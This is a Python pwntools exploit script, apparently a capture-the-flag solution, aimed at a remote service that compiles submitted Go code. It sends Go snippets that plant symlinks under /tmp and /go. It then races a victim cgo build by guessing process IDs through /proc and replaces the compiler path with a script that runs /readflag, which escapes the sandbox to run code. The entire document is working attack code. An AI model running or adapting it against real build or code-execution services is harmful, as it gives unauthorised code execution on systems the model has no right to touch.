#!/usr/bin/env python3

import sys
from base64 import b64encode
from pwn import context, remote

context.log_level = "error"

REMOTE = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 31337)
SETTLE = 2.2
SPAN = 120

WARM = b'package main;import ."syscall";func main(){println(Getpid())}'

MK_S = b'package main;import ."os";func main(){Symlink("/dev/random","/tmp/s")}'
CK_S = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/s");panic(e)}'

MK_P = b'package main;import ."os";func main(){panic(Symlink("/proc","/tmp/p"))}'
CK_P = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/p");panic(e)}'

MK_X = b'package main;import ."os";func main(){Symlink("c/main.go","/tmp/x")}'
CK_X = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/x");panic(e)}'

MK_I = b'package main;import ."os";func main(){Symlink("/go/bin/gcc","/go/i")}'
CK_I = b'package main;import ."os";func main(){_,e:=Readlink("/go/i");panic(e)}'

MK_R = b'package main;import ."os";func main(){Symlink("/readflag","/go/r")}'
CK_R = b'package main;import ."os";func main(){_,e:=Readlink("/go/r");panic(e)}'

RM_C = b'package main;import ."os";func main(){panic(Remove("/tmp/c"))}'

VICTIM = b'//bin/echo \\#!/go/r pls>/go/i\npackage main\n/*#include"../s"*/\nimport "C"'
TRIG = b'package main;import ."os/exec";func main(){Command("sh","/tmp/x").Run()}'
CHMOD = b'package main;import ."os";func main(){Chmod("/go/i",0755)}'
FINAL = b'package main\nimport "C"\nfunc main(){}'


def req(src: bytes, timeout: float = 6.0) -> bytes:
    io = remote(*REMOTE)
    io.recvuntil(b"source code (b64):\n")
    io.recvline()
    io.sendline(b64encode(src))
    out = io.recvall(timeout=timeout)
    io.close()
    return out


def ensure(make: bytes, check: bytes, tries: int = 4) -> None:
    for _ in range(tries):
        req(make)
        if b"panic: nil" in req(check):
            return


def link_c(pid: int) -> bytes:
    return f'package main;import ."os";func main(){{Symlink("p/{pid}/cwd","/tmp/c")}}'.encode()


def main() -> None:
    for _ in range(3):
        req(WARM)

    req(RM_C)
    ensure(MK_S, CK_S)
    ensure(MK_P, CK_P)
    ensure(MK_X, CK_X)
    ensure(MK_I, CK_I)
    ensure(MK_R, CK_R)

    victim = remote(*REMOTE)
    victim.recvuntil(b"source code (b64):\n")
    victim.recvline()
    victim.sendline(b64encode(VICTIM))
    victim.recvrepeat(SETTLE)

    probe = int(req(WARM).strip().splitlines()[-1])

    for pid in range(probe - SPAN, probe + 1):
        req(RM_C)
        req(link_c(pid))
        req(TRIG)

    req(CHMOD)
    out = req(FINAL)
    print(out.decode("latin1"), end="")
    victim.close()


if __name__ == "__main__":
    main()
